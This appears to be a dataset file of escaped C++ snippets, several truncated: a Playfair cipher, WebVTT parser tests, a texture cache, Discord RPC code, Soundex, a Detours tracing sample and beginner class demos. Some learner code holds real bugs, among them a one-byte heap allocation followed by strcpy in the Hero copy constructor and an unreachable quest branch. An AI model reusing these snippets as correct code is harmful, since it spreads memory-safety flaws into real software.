Encryption key: \";\r\n    string user_key_Input;\r\n    cin >> user_key_Input;\r\n    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n    \r\n\r\n    cipher_key(key, user_key_Input);\r\n    \r\n    cout <<endl<< \"Enter your message: \";\r\n    \r\n    string input_message;\r\n    getline(cin, input_message);\r\n    \r\n    string updated_message = input_message;\r\n\r\n    for (size_t i = 0; i < updated_message.length(); ++i) \r\n    {  \r\n        if (updated_message[i] == ' ') \r\n        {\r\n            for (int j = i; j < updated_message.length() - 1; ++j) \r\n            {\r\n                updated_message[j] = updated_message[j + 1];\r\n            }\r\n            updated_message.pop_back();\r\n            i--;\r\n        }\r\n    }\r\n    cout<<endl<<\"Removing any spaces : \"<<updated_message<<endl;\r\n    \r\n    for (size_t i = 0; i < updated_message.length(); ++i) \r\n    {  \r\n        if (updated_message[i] >= 'a' && updated_message[i] <= 'z') \r\n        {\r\n            updated_message[i] -= 32;\r\n        }\r\n    }\r\n    cout<<endl<<\"capitalizing every letter : \"<<updated_message<<endl;\r\n\r\n\r\n    for (int c = 0; c < updated_message.length() - 1; c++) \r\n    {\r\n        if (updated_message[c] == updated_message[c + 1] && c%2 == 0)\r\n        {\r\n            updated_message.insert(c + 1, \"X\");\r\n        }\r\n    }\r\n    cout<<endl<<\"adding x between the doubles in letters : \"<<updated_message<<endl;\r\n    \r\n    if (updated_message.length() % 2 != 0) \r\n    {\r\n        updated_message += 'X';\r\n    }\r\n    cout<<endl<<\"adding x at the end in case the Message has an odd number of characters : \"<<updated_message<<endl;\r\n\r\n    char *coded = new char[updated_message.length() + 1];\r\n\r\n    cout<<endl<<\"Message to be Encrypted : \"; \r\n    int x = 0;\r\n    while (x < updated_message.length())\r\n    {\r\n        char firstChar = updated_message[x];\r\n        char secondChar = updated_message[x + 1];\r\n        \r\n        int firstRow, firstCol, secondRow, secondCol;\r\n        for (int i = 0; i < 6; i++) \r\n        {\r\n            for (int j = 0; j < 6; j++) \r\n            {\r\n                if (key[i][j] == firstChar) \r\n                {\r\n                    firstRow = i;\r\n                    firstCol = j;\r\n                }\r\n                if (key[i][j] == secondChar) \r\n                {\r\n                    secondRow = i;\r\n                    secondCol = j;\r\n                }\r\n            }\r\n        }\r\n        cout<<firstChar<<secondChar<<\"\\t\";\r\n    \r\n        if (firstRow == secondRow) \r\n        {\r\n            coded[x] = key[firstRow][(firstCol + 1) % 6];\r\n            coded[x + 1] = key[secondRow][(secondCol + 1) % 6];\r\n        }\r\n        else if (firstCol == secondCol)\r\n        {\r\n            coded[x] = key[(firstRow + 1) % 6][firstCol];\r\n            coded[x + 1] = key[(secondRow + 1) % 6][secondCol];\r\n        } \r\n        else \r\n        {\r\n            coded[x] = key[firstRow][secondCol];\r\n            coded[x + 1] = key[secondRow][firstCol];\r\n        }   \r\n        x += 2;\r\n    }\r\n    cout<<endl;\r\n\r\n    cout <<endl<< \"Encrypted message: \";\r\n    for (int i = 0; i < x; ++i)\r\n       cout << coded[i];\r\n    \r\n    cout << endl;\r\n\r\n    delete[] coded;\r\n   \r\n   cout<<endl<<\"The playfair cipher with the input key : \"<<endl;\r\n    \r\n    for (int i = 0; i <",
    "#include \"payload_testfixture\"\nclass PayloadBoldTag : public PayloadTest {};\n\n/*\n * Verifies that a bold cue text tag is parsed correctly.\n * From http://dev.w3.org/html5/webvtt/#webvtt-cue-bold-span\n *  Bold tags consist of:\n *    1. A cue span start tag \"b\" that disallows an annotation.\n *    2. Possible cue internal text representing the boldened text.\n *    3. A cue span end tag.\n */\nTEST_F(PayloadBoldTag, BoldTag)\n{\n  loadVtt( \"payload/b-tag/b-tag.vtt\", 1 );\n\n  const Node head = getHeadOfCue( 0 );\n\n  ASSERT_EQ( 3, head.childCount() );\n  ASSERT_EQ( Node::Bold, head[ 1 ].kind() );\n}\n\n/*\n * Verifies that a bold tag with an annotation is parsed correctly but does not contain the annotation.\n * From http://dev.w3.org/html5/webvtt/#webvtt-cue-bold-span (11/27/2012)\n *  Bold tags consist of:\n *    1. A cue span start tag \"b\" that disallows an annotation.\n *    2. Possible cue internal text representing the boldened text.\n *    3. A cue span end tag.\n */\nTEST_F(PayloadBoldTag, BoldTagAnnotation)\n{\n  loadVtt( \"payload/b-tag/b-tag-annotation.vtt\", 1 );\n\n  const Node head = getHeadOfCue( 0 );\n\n  ASSERT_EQ( 3, head.childCount() );\n  ASSERT_EQ( Node::Bold, head[ 1 ].kind() );\n  ASSERT_TRUE( head[ 1 ].annotation().isEmpty() );\n}\n\n/*\n * Verifies that a single subclass can be attached to a cue text bold start tag.\n * From http://dev.w3.org/html5/webvtt/#webvtt-cue-span-start-tag (11/27/2012)\n *  Cue span start tags consist of the following:\n *    1. A \"<\" character representing the beginning of the start tag.\n *    2. The tag name.\n *    3. Zero or more the following sequence representing a subclasses of the start tag\n *      3.1. A full stop \".\" character.\n *      3.2. A sequence of non-whitespace characters.\n *    4. If the start tag requires an annotation then a space or tab character followed by a sequence of\n *       non-whitespace characters representing the annotation.\n *    5. A \">\" character repsenting the end of the start tag.\n */\nTEST_F(PayloadBoldTag, BoldTagSingleSubclass)\n{\n  loadVtt( \"payload/b-tag/b-tag-single-subclass.vtt\", 1 );\n\n  const Node head = getHeadOfCue( 0 );\n\n  ASSERT_EQ( 3, head.childCount() );\n  ASSERT_EQ( Node::Bold, head[ 1 ].kind() );\n\n  StringList cssClasses = head[ 1 ].cssClasses();\n\n  ASSERT_EQ( 1, cssClasses.length() );\n  expectEquals( \"class\", cssClasses.stringAt( 0 ) );\n}\n\n/*\n * Verifies that multiple subclasses can be attached to a cue text bold start tag.\n * From http://dev.w3.org/html5/webvtt/#webvtt-cue-span-start-tag (11/27/2012)\n *  Cue span start tags consist of the following:\n *    1. A \"<\" character representing the beginning of the start tag.\n *    2. The tag name.\n *    3. Zero or more the following sequence representing a subclasses of the start tag\n *      3.1. A full stop \".\" character.\n *      3.2. A sequence of non-whitespace characters.\n *    4. If the start tag requires an annotation then a space or tab character followed by a sequence of\n *       non-whitespace characters representing the annotation.\n *    5. A \">\" character repsenting the end of the start tag.\n */\nTEST_F(PayloadBoldTag, BoldTagMultiSubclass)\n{\n  loadVtt( \"payload/b-tag/b-tag-multi-subclass.vtt\", 1 );\n\n  const Node head = getHeadOfCue( 0 );\n\n  ASSERT_EQ( 3, head.childCount() );\n  ASSERT_EQ( Node::Bold, head[ 1 ].kind() );\n\n  StringList cssClasses = head[ 1 ].cssClasses();\n\n  ASSERT_EQ( 2, cssClasses.length() );\n  expectEquals( \"class\", cssClasses.stringAt( 0 ) );\n  expectEquals( \"subclass\", cssClasses.stringAt( 1 ) );\n}\n",
    "#include \"TextureCache.hpp\"\n#include <filesystem>\n#include <fstream>\n#include <raylib.h>\n#include <vector>\n#include <unordered_map>\n#include <glaze/glaze.hpp>\n#include \"ThreadPool.h\"\n#include <mutex>\n#include <optional>\n#include <libassert/assert.hpp>\n\n#include <icecream.hpp>\n\n#include <iostream>\n\nnamespace fs = std::filesystem;\n\nstruct Plist\n{\n    struct Metadata\n    {\n        std::string textureFileName;\n    };\n\n    std::unordered_map<std::string, FrameInfo> frames;\n    Metadata metadata;\n    bool operator==(const Plist& b) const\n    {\n        return metadata.textureFileName == b.metadata.textureFileName;\n    }\n};\n\nnamespace std {\n    template <>\n    struct hash<Plist> {\n        size_t operator()(const Plist& p) const {\n            return std::hash<std::string>{}(p.metadata.textureFileName);\n        }\n    };\n}\n\n\nstruct TextureCache::impl\n{\n    std::unordered_map<Plist, Texture2D> plists;\n    std::vector<std::filesystem::path> searchPaths;\n    std::mutex searchPathMutex;\n\n\n    static std::optional<std::pair<Plist, Image>> getPlistImage(TextureCache* tc, std::string_view sheet)\n    {\n        auto plistpath = tc->getFilePath(sheet);\n        if(plistpath.empty()) return {};\n\n        std::ifstream f(plistpath);\n        if(!f) return {};\n        std::string content{std::istreambuf_iterator<char>(f), std::istreambuf_iterator<char>()};\n\n        if(content.empty()) return {};\n\n        Plist plist;\n\n        constexpr auto opts = glz::opts{\n            .error_on_unknown_keys = false,\n            .shrink_to_fit = true\n        };\n\n        auto p = glz::read<opts, Plist>(plist, content);\n        if(p != 0)\n        {\n            PANIC(\"Could not load json of plist\", sheet);\n        }\n\n        auto pngpath = tc->getFilePath(plist.metadata.textureFileName);\n\n        if(pngpath.empty()) return {};\n\n        auto image = LoadImage(pngpath.string().c_str());\n\n        decltype(getPlistImage(tc, sheet)) ret;\n        auto& pair = ret.emplace();\n        pair.first = std::move(plist);\n        pair.second = image;\n        return ret; \n    }\n};\n\nTextureCache::~TextureCache() = default;\nTextureCache::TextureCache() : m(new impl) {};\n\n\nbool TextureCache::addSearchPath(const fs::path& p)\n{\n    if(fs::is_directory(p) && fs::exists(p))\n    {\n        std::lock_guard lock(m->searchPathMutex);\n        m->searchPaths.emplace_back(p);\n        return true;\n    }\n    return false;\n}\n\nstd::filesystem::path TextureCache::getFilePath(std::string_view fileName)\n{\n    std::lock_guard lock(m->searchPathMutex);\n    for(const auto& sp : m->searchPaths)\n    {\n        if(auto path = sp / fileName; fs::exists(path))\n        {\n            return path;\n        }\n    }\n    return {};\n}\n\n\nvoid TextureCache::addPlist(std::string_view sheetName, const LoadImagCallback& callback)\n{\n\n}\n\n\n//add all used ones here\n\n\ntemplate<range_of<std::string_view> R>\nvoid TextureCache::addPlistsAsync(const R& sheets, const LoadImagCallback& callback)\n{\n    std::vector<std::future<std::optional<std::pair<Plist, Image>>>> futures;\n\n    constexpr auto maxThreads = 20;\n\n    size_t threads = sheets.size() > maxThreads ? maxThreads : sheets.size();\n\n    IC(sheets.size(), threads);\n\n    progschj::ThreadPool threadPool{threads};\n\n\n    for(const auto& sheet : sheets)\n    {\n        futures.push_back(threadPool.enqueue(impl::getPlistImage, this, sheet));\n    }\n\n\n    for(auto& f : futures)\n    {\n        const auto& opt = f.get();\n\n        if(!opt)\n        {\n            PANIC(\"Could not load plist image\");\n        }\n\n        auto& pair = opt.value();\n        if(!IsImageReady(pair.second))\n        {\n            PANIC(\"Error loading plist image\", pair.first.metadata.textureFileName);\n        }\n\n        Texture2D texture = LoadTextureFromImage(pair.second);\n        if(!IsTextureReady(texture))\n        {\n            PANIC(\"Error loading texture\", pair.first.metadata.textureFileName);\n        }\n\n        m->plists.insert({std::move(pair.first), texture});\n\n    }\n    \n   std::cout << \"Finished loading textures\" << std::endl;\n\n\n}\n\n\ntemplate void TextureCache::addPlistsAsync(const std::vector<std::string>& t, const LoadImagCallback& callback);\n\n\nFrameInfo* TextureCache::getFrame(std::string_view name)\n{\n    return nullptr;\n}\n\nstd::string TextureCache::getFileString(std::string_view fileName)\n{\n    std::ifstream f(getFilePath(fileName));\n    if(!f.good()) return {};\n    return std::string(std::istreambuf_iterator<char>(f), std::istreambuf_iterator<char>());\n}",
    "#include \"discord_rpc.h\"\n\n#include \"backoff.h\"\n#include \"discord_register.h\"\n#include \"msg_queue.h\"\n#include \"rpc_connection.h\"\n#include \"serialization.h\"\n\n#include <atomic>\n#include <chrono>\n#include <mutex>\n\n#ifndef DISCORD_DISABLE_IO_THREAD\n#include <condition_variable>\n#include <thread>\n#endif\n\nconstexpr size_t MaxMessageSize{16 * 1024};\nconstexpr size_t MessageQueueSize{8};\nconstexpr size_t JoinQueueSize{8};\n\nstruct QueuedMessage {\n    size_t length;\n    char buffer[MaxMessageSize];\n\n    void Copy(const QueuedMessage& other)\n    {\n        length = other.length;\n        if (length) {\n            memcpy(buffer, other.buffer, length);\n        }\n    }\n};\n\nstruct User {\n    // snowflake (64bit int), turned into a ascii decimal string, at most 20 chars +1 null\n    // terminator = 21\n    char userId[32];\n    // 32 unicode glyphs is max name size => 4 bytes per glyph in the worst case, +1 for null\n    // terminator = 129\n    char username[344];\n    // 4 decimal digits + 1 null terminator = 5\n    char discriminator[8];\n    // optional 'a_' + md5 hex digest (32 bytes) + null terminator = 35\n    char avatar[128];\n    // Rounded way up because I'm paranoid about games breaking from future changes in these sizes\n};\n\nstatic RpcConnection* Connection{nullptr};\nstatic DiscordEventHandlers QueuedHandlers{};\nstatic DiscordEventHandlers Handlers{};\nstatic std::atomic_bool WasJustConnected{false};\nstatic std::atomic_bool WasJustDisconnected{false};\nstatic std::atomic_bool GotErrorMessage{false};\nstatic std::atomic_bool WasJoinGame{false};\nstatic std::atomic_bool WasSpectateGame{false};\nstatic std::atomic_bool UpdatePresence{false};\nstatic char JoinGameSecret[256];\nstatic char SpectateGameSecret[256];\nstatic int LastErrorCode{0};\nstatic char LastErrorMessage[256];\nstatic int LastDisconnectErrorCode{0};\nstatic char LastDisconnectErrorMessage[256];\nstatic std::mutex PresenceMutex;\nstatic std::mutex HandlerMutex;\nstatic QueuedMessage QueuedPresence{};\nstatic MsgQueue<QueuedMessage, MessageQueueSize> SendQueue;\nstatic MsgQueue<User, JoinQueueSize> JoinAskQueue;\nstatic User connectedUser;\n\n// We want to auto connect, and retry on failure, but not as fast as possible. This does expoential\n// backoff from 0.5 seconds to 1 minute\nstatic Backoff ReconnectTimeMs(500, 60 * 1000);\nstatic auto NextConnect = std::chrono::system_clock::now();\nstatic int Pid{0};\nstatic int Nonce{1};\n\n#ifndef DISCORD_DISABLE_IO_THREAD\nstatic void Discord_UpdateConnection(void);\nclass IoThreadHolder {\nprivate:\n    std::atomic_bool keepRunning{true};\n    std::mutex waitForIOMutex;\n    std::condition_variable waitForIOActivity;\n    std::thread ioThread;\n\npublic:\n    void Start()\n    {\n        keepRunning.store(true);\n        ioThread = std::thread([&]() {\n            const std::chrono::duration<int64_t, std::milli> maxWait{500LL};\n            Discord_UpdateConnection();\n            while (keepRunning.load()) {\n                std::unique_lock<std::mutex> lock(waitForIOMutex);\n                waitForIOActivity.wait_for(lock, maxWait);\n                Discord_UpdateConnection();\n            }\n        });\n    }\n\n    void Notify() { waitForIOActivity.notify_all(); }\n\n    void Stop()\n    {\n        keepRunning.exchange(false);\n        Notify();\n        if (ioThread.joinable()) {\n            ioThread.join();\n        }\n    }\n\n    ~IoThreadHolder() { Stop(); }\n};\n#else\nclass IoThreadHolder {\npublic:\n    void Start() {}\n    void Stop() {}\n    void Notify() {}\n};\n#endif // DISCORD_DISABLE_IO_THREAD\nstatic IoThreadHolder* IoThread{nullptr};\n\nstatic void UpdateReconnectTime()\n{\n    NextConnect = std::chrono::system_clock::now() +\n      std::chrono::duration<int64_t, std::milli>{ReconnectTimeMs.nextDelay()};\n}\n\n#ifdef DISCORD_DISABLE_IO_THREAD\nextern \"C\" DISCORD_EXPORT void Discord_UpdateConnection(void)\n#else\nstatic void Discord_UpdateConnection(void)\n#endif\n{\n    if (!Connection) {\n        return;\n    }\n\n    if (!Connection->IsOpen()) {\n        if (std::chrono::system_clock::now() >= NextConnect) {\n            UpdateReconnectTime();\n            Connection->Open();\n        }\n    }\n    else {\n        // reads\n\n        for (;;) {\n            JsonDocument message;\n\n            if (!Connection->Read(message)) {\n                break;\n            }\n\n            const char* evtName = GetStrMember(&message, \"evt\");\n            const char* nonce = GetStrMember(&message, \"nonce\");\n\n            if (nonce) {\n                // in responses only -- should use to match up response when needed.\n\n                if (evtName && strcmp(evtName, \"ERROR\") == 0) {\n                    auto data = GetObjMember(&message, \"data\");\n                    LastErrorCode = GetIntMember(data, \"code\");\n                    StringCopy(LastErrorMessage, GetStrMember(data, \"message\", \"\"));\n                    GotErrorMessage.store(true);\n                }\n            }\n            else {\n                // should have evt == name of event, optional data\n                if (evtName == nullptr) {\n             ",
    "#include \"quests.h\"\n#include \"inventory.h\"\n\n#include <iostream>\n#include <string>\n#include <iomanip>\n#include <sys/ioctl.h>\n#include <fstream>\n#include <thread>\n#include <chrono>\n#include <ctime>\n\nvoid quests(){\n    std::string completeQuestOption;\n    std::cout << \"\\nQuests:\";\n    std::cout << \"Quests complete: \" << questsDone << \".\\n\";\n    std::cout << \"[0] Quest: Obtain 10 string\\n\";\n    std::cout << \"[1] Quest: Obtain 10 string\\n\";\n    std::cout << \"Complete quest? y/n > \";\n    std::cin >> completeQuestOption;\n    if(completeQuestOption == \"y\"){\n        if(stringItem >= 10 && questsDone == 0){\n        questsDone++;\n        stringItem -= 10;\n        money += 0.0000000010;\n        std::cout << \"Quest complete!\\n\";\n    } else {\n        std::cout << \"Insufficient materials...\\n\";\n    }\n    } else if(completeQuestOption == \"y\"){\n        if(clayBowlItem >= 1 && questsDone == 1){\n        questsDone++;\n        clayBowlItem -= 1;\n        money += 0.0000000050;\n        std::cout << \"Quest complete!\\n\";\n    } else {\n        std::cout << \"Insufficient materials...\\n\";\n    }\n    } else if (completeQuestOption == \"n\"){\n        std::cout << \"Exited...\\n\";\n    } else {\n        std::cout << \"Quest error...\\n\";\n    }\n}\n",
    "#include <iostream>\n#include <string>\n\nstd::string soundex (std::string text) {\n    std::string result;\n\n    for (int c = 0; c <= text.size(); ++c) {\n        if (c == 0) {\n            result += text[c];\n        } else if (text[c] == 'a' || \n                   text[c] == 'e' || \n                   text[c] == 'h' || \n                   text[c] == 'i' || \n                   text[c] == 'o' || \n                   text[c] == 'u' || \n                   text[c] == 'w' || \n                   text[c] == 'y') {\n            continue;\n        } else if (text[c] == 'b' || \n                   text[c] == 'f' || \n                   text[c] == 'p' || \n                   text[c] == 'v') {\n            if (result[result.size() - 1] == '1'){\n                continue;\n            } else {\n            result += '1';\n            }\n        } else if (text[c] == 'c' || \n                   text[c] == 'g' || \n                   text[c] == 'j' || \n                   text[c] == 'k' || \n                   text[c] == 'q' || \n                   text[c] == 's' || \n                   text[c] == 'x' || \n                   text[c] == 'z') {\n            if (result[result.size() - 1] == '2'){\n                continue;\n            } else {\n            result += '2';\n            }\n        } else if (text[c] == 'd' || \n                   text[c] == 't') {\n            if (result[result.size() - 1] == '3'){\n                continue;\n            } else {\n            result += '3';\n            }\n        } else if (text[c] == 'l') {\n            if (result[result.size() - 1] == '4'){\n                continue;\n            } else {\n            result += '4';\n            }\n        } else if (text[c] == 'm' || \n                   text[c] == 'n') {\n            if (result[result.size() - 1] == '5'){\n                continue;\n            } else {\n            result += '5';\n            }\n        } else if (text[c] == 'r') {\n            if (result[result.size() - 1] == '6'){\n                continue;\n            } else {\n            result += '6';\n            }\n        }\n    }\n\n    if (result.size() < 4) {\n        for (int c = 0; c <= 4 - result.size(); c++) {\n            result += '0';\n        }\n    } else {\n        result = result.substr(0, 4);\n    }\n\n    return result;\n\n}\n\nint main() {\n    std::string incoming_text;\n    std::cin >> incoming_text;\n\n    std::cout << soundex(incoming_text);\n\n    return 0;\n}",
    "//////////////////////////////////////////////////////////////////////////////\n//\n//  Detours Test Program (trctcp.cpp of trctcp.dll)\n//\n//  Microsoft Research Detours Package\n//\n//  Copyright (c) Microsoft Corporation.  All rights reserved.\n//\n#define _WIN32_WINNT        0x0501\n#define WIN32\n#define NT\n#define _WINSOCK_DEPRECATED_NO_WARNINGS\n\n#define DBG_TRACE   0\n\n#if _MSC_VER >= 1300\n#include <winsock2.h>\n#endif\n#include <windows.h>\n#include <stdio.h>\n#include \"detours.h\"\n#include \"syelog.h\"\n\n#define PULONG_PTR          PVOID\n#define PLONG_PTR           PVOID\n#define ULONG_PTR           PVOID\n#define ENUMRESNAMEPROCA    PVOID\n#define ENUMRESNAMEPROCW    PVOID\n#define ENUMRESLANGPROCA    PVOID\n#define ENUMRESLANGPROCW    PVOID\n#define ENUMRESTYPEPROCA    PVOID\n#define ENUMRESTYPEPROCW    PVOID\n#define STGOPTIONS          PVOID\n\n//////////////////////////////////////////////////////////////////////////////\n#pragma warning(disable:4127)   // Many of our asserts are constants.\n\n#define ASSERT_ALWAYS(x)   \\\n    do {                                                        \\\n    if (!(x)) {                                                 \\\n            AssertMessage(#x, __FILE__, __LINE__);              \\\n            DebugBreak();                                       \\\n    }                                                           \\\n    } while (0)\n\n#ifndef NDEBUG\n#define ASSERT(x)           ASSERT_ALWAYS(x)\n#else\n#define ASSERT(x)\n#endif\n\n#define UNUSED(c)       (c) = (c)\n\n//////////////////////////////////////////////////////////////////////////////\nstatic HMODULE s_hInst = NULL;\nstatic WCHAR s_wzDllPath[MAX_PATH];\n\nVOID _PrintDump(SOCKET socket, PCHAR pszData, INT cbData);\nVOID _PrintEnter(PCSTR psz, ...);\nVOID _PrintExit(PCSTR psz, ...);\nVOID _Print(PCSTR psz, ...);\n\nVOID AssertMessage(CONST PCHAR pszMsg, CONST PCHAR pszFile, ULONG nLine);\n\n//////////////////////////////////////////////////////////////////////////////\n//\nextern \"C\" {\n    HANDLE (WINAPI * Real_CreateFileW)(LPCWSTR a0,\n                                       DWORD a1,\n                                       DWORD a2,\n                                       LPSECURITY_ATTRIBUTES a3,\n                                       DWORD a4,\n                                       DWORD a5,\n                                       HANDLE a6)\n        = CreateFileW;\n\n    BOOL (WINAPI * Real_WriteFile)(HANDLE hFile,\n                                   LPCVOID lpBuffer,\n                                   DWORD nNumberOfBytesToWrite,\n                                   LPDWORD lpNumberOfBytesWritten,\n                                   LPOVERLAPPED lpOverlapped)\n        = WriteFile;\n\n    BOOL (WINAPI * Real_FlushFileBuffers)(HANDLE hFile)\n        = FlushFileBuffers;\n\n    BOOL (WINAPI * Real_CloseHandle)(HANDLE hObject)\n        = CloseHandle;\n\n    BOOL (WINAPI * Real_WaitNamedPipeW)(LPCWSTR lpNamedPipeName, DWORD nTimeOut)\n        = WaitNamedPipeW;\n\n    BOOL (WINAPI * Real_SetNamedPipeHandleState)(HANDLE hNamedPipe,\n                                                 LPDWORD lpMode,\n                                                 LPDWORD lpMaxCollectionCount,\n                                                 LPDWORD lpCollectDataTimeout)\n        = SetNamedPipeHandleState;\n\n    DWORD (WINAPI * Real_GetCurrentProcessId)(VOID)\n        = GetCurrentProcessId;\n\n    VOID (WINAPI * Real_GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime)\n        = GetSystemTimeAsFileTime;\n\n    VOID (WINAPI * Real_InitializeCriticalSection)(LPCRITICAL_SECTION lpSection)\n        = InitializeCriticalSection;\n\n    VOID (WINAPI * Real_EnterCriticalSection)(LPCRITICAL_SECTION lpSection)\n        = EnterCriticalSection;\n\n    VOID (WINAPI * Real_LeaveCriticalSection)(LPCRITICAL_SECTION lpSection)\n        = LeaveCriticalSection;\n}\n\nDWORD (WINAPI * Real_GetModuleFileNameW)(HMODULE a0,\n                                         LPWSTR a1,\n                                         DWORD a2)\n    = GetModuleFileNameW;\n\nBOOL (WINAPI * Real_CreateProcessW)(LPCWSTR a0,\n                                    LPWSTR a1,\n                                    LPSECURITY_ATTRIBUTES a2,\n                                    LPSECURITY_ATTRIBUTES a3,\n                                    BOOL a4,\n                                    DWORD a5,\n                                    LPVOID a6,\n                                    LPCWSTR a7,\n                                    LPSTARTUPINFOW a8,\n                                    LPPROCESS_INFORMATION a9)\n    = CreateProcessW;\n\n#if _MSC_VER < 1300\nSOCKET (WINAPI * Real_WSAAccept)(SOCKET a0,\n                                 sockaddr* a1,\n                                 LPINT a2,\n                                 LPCONDITIONPROC a3,\n                                 DWORD a4)\n    = WSAAccept;\n#else\nSOCKET (WINAPI * Real_WSAAccept)(SOCKET a0,\n                                 sockaddr* a1,\n                                 LPINT a2,\n                                 LPCONDITIONPROC a3,\n ",
    "/*\nProblem Statement - 3169 : Count Days without Meeting\nYou are given a positive integer days representing the total number of days an employee is available for work (starting from day 1). You are also given a 2D array meetings of size n where, meetings[i] = [start_i, end_i] represents the starting and ending days of meeting i (inclusive).\n\nReturn the count of days when the employee is available for work but no meetings are scheduled.\n\nNote: The meetings may overlap.\n\n \n\nExample 1:\n\nInput: days = 10, meetings = [[5,7],[1,3],[9,10]]\n\nOutput: 2\n\nExplanation:\n\nThere is no meeting scheduled on the 4th and 8th days.\n\nExample 2:\n\nInput: days = 5, meetings = [[2,4],[1,3]]\n\nOutput: 1\n\nExplanation:\n\nThere is no meeting scheduled on the 5th day.\n\nExample 3:\n\nInput: days = 6, meetings = [[1,6]]\n\nOutput: 0\n\nExplanation:\n\nMeetings are scheduled for all working days.\n\n \n\nConstraints:\n\n1 <= days <= 109\n1 <= meetings.length <= 105\nmeetings[i].length == 2\n1 <= meetings[i][0] <= meetings[i][1] <= days   \n*/\n\nclass Solution {\npublic:\n    int countDays(int days, vector<vector<int>>& meetings) {\n        if (meetings.empty()) return days;\n\n        sort(meetings.begin(), meetings.end());\n\n        int total_engaged_days = 0;\n        int current_start = meetings[0][0];\n        int current_end = meetings[0][1];\n\n        for (int i = 1; i < meetings.size(); ++i) {\n            int start = meetings[i][0];\n            int end = meetings[i][1];\n\n            if (start <= current_end + 1) {\n                current_end = max(current_end, end);\n            } else {\n                total_engaged_days += current_end - current_start + 1;\n                current_start = start;\n                current_end = end;\n            }\n        }\n\n        total_engaged_days += current_end - current_start + 1;\n\n        int free_days = days - total_engaged_days;\n\n        return free_days;\n    }\n};",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include<iostream>\r\n#include<cstring>\r\nusing namespace std;\r\n\r\nclass Hero{\r\n   //properties\r\n    private:\r\n    int health;\r\n\r\n    public: \r\n    char* name;\r\n    char level;\r\n    static int timetoComplete;\r\n\r\n    //Deafault constructor\r\n     Hero(){\r\n        cout<<\"Default Constructor called \"<<endl;\r\n        name = new char[100];\r\n    } \r\n\r\n    //Parameterised constructor\r\n    Hero(int health){\r\n        this -> health=health;\r\n    }\r\n\r\n    Hero(int health, char level){\r\n        this -> level = level;\r\n        this -> health=health;\r\n    }\r\n\r\n     //copy constructor  \r\n    Hero(Hero& temp){\r\n\r\n        char *ch = new char(strlen(temp.name)+1);\r\n        strcpy(ch, temp.name);\r\n        this->name = ch;\r\n\r\n        cout<<\"Copy Constructor Called\"<<endl;\r\n        this -> health = temp.health;\r\n        this -> level = temp.level;\r\n    } \r\n\r\n    void print(){\r\n        cout<<endl;\r\n        cout<<\"name: \"<<this->name<<\", \";\r\n        cout<< \"health: \"<<this->health<<\", \";\r\n        cout<<\"level: \"<< this->level << endl;\r\n        cout<<endl;\r\n    }\r\n\r\n    int getHealth(){\r\n        return health;\r\n    }\r\n\r\n    char getLevel(){\r\n        return level;\r\n    }\r\n\r\n    void setHealth(int h){\r\n        health = h;\r\n    }\r\n\r\n    void setLevel(char ch){\r\n        level = ch;\r\n    }\r\n\r\n    void setName(char name[]){\r\n        strcpy(this->name,name);\r\n    }\r\n\r\n    static int random(){\r\n        return timetoComplete;\r\n    }\r\n\r\n    //Destructor\r\n    ~Hero(){\r\n        cout<<\"Destructor is called\"<<endl;\r\n    }\r\n};\r\n\r\nint Hero :: timetoComplete = 5;\r\n\r\n\r\nint main()\r\n{  \r\n    //cout<< Hero :: timetoComplete << endl;  //advisable way \r\n    cout<< Hero :: random() << endl;\r\n\r\n  /*   \r\n    Hero a;\r\n    cout<< a.timetoComplete << endl;\r\n\r\n    Hero b;\r\n    b.timetoComplete = 10;\r\n    cout<< a.timetoComplete << endl;\r\n    cout<< b.timetoComplete << endl;\r\n */\r\n\r\n /*    //Static     \r\n    Hero a;\r\n\r\n    //Dynamic  -> it is called manually\r\n    Hero*b = new Hero;\r\n    delete b;\r\n */\r\n    \r\n/* \r\n    Hero hero1;\r\n    hero1.setHealth(200);\r\n    hero1.setLevel('D');\r\n    char name[10] = \"Priyanshu\";\r\n    hero1.setName(name);\r\n\r\n    //hero1.print();\r\n\r\n    //use default copy constructor  \r\n     \r\n    Hero hero2(hero1);\r\n    //hero2.print(); \r\n\r\n    hero1.name[0] = 'B';\r\n    hero1.print();\r\n\r\n    hero2.print();  \r\n\r\n    hero1 = hero2;   //copy assignment operator\r\n     hero1.print();\r\n\r\n    hero2.print();\r\n\r\n */\r\n\r\n   /*  Hero Rajat(80,'C');\r\n    Rajat.print();\r\n\r\n    //copy constructor\r\n    Hero Priyanshu(Rajat);\r\n    Priyanshu.print();\r\n    \r\n   */\r\n\r\n\r\n\r\n\r\n\r\n   /* \r\n    Hero thg;\r\n\r\n    //object created statically\r\n    Hero Rahul(15);\r\n  